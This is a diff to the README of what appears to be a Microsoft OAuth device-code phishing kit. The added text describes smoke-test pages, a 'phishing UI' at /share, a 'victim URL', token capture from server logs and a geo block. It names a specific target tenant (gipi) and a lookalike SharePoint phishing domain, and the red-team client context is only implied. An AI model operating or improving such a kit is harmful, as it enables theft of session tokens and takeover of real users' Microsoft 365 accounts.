@@ -159,11 +159,27 @@ Set `"validateTokens": false` in config to disable.
 
 ## Smoke test (no victim account needed)
 
-Verify config, TLS files, and OAuth device-code issuance without completing a login:
+While the server is running, open the smoke test page (no geo block):
+
+```
+https://your-domain/smoke-test
+```
+
+Setup and `npm start` print this URL alongside the victim URL. The page checks config, TLS, production OAuth (gipi tenant), and `/common/` OAuth.
+
+**Self-test full capture** with any Azure AD account you control (does not use production tenant):
+
+```
+https://your-domain/smoke-test/self
+```
+
+Same phishing UI as `/share`, but uses Microsoft `/common/` endpoints and polls for tokens in the server logs.
+
+CLI alternative (server can stay up):
 
 ```bash
 npm run smoke-test
-npm run smoke-test -- --live-url https://gipi.sharepoint.com.documents.v06.zip/share
+npm run smoke-test -- --live-url https://your-domain/smoke-test
 ```
 
 ### Self-test without the client's tenant
@@ -176,27 +192,11 @@ Microsoft provides **generic endpoints** that work with any Azure AD work accoun
 | `organizations` | Work/school only (no personal Microsoft accounts) |
 | `yourname.onmicrosoft.com` | Your own dev tenant |
 
-**Quick self-test with `/common/`:**
-
-```bash
-npm run setup -- --test-mode --tenant common
-npm start
-npm run smoke-test -- --use-common
-```
-
-Visit `http://localhost/share` (or your HTTPS URL) and sign in at `microsoft.com/devicelogin` with **any account you own** in Azure AD (not the client's gipi.com tenant).
-
 **Free dev tenant (no custom domain required):**
 
 1. Join the [Microsoft 365 Developer Program](https://developer.microsoft.com/microsoft-365/dev-program)
 2. You get `something.onmicrosoft.com` + test users in the admin portal
-3. Run setup with that tenant:
-
-```bash
-npm run setup -- --test-mode --tenant yourtenant.onmicrosoft.com
-```
-
-OpenID discovery fills in `tokenUrl` and `deviceCodeUrl` automatically — same as for gipi.com.
+3. Run setup with that tenant for a dedicated lab, or use `/smoke-test/self` against production config
 
 ## Certificates
 
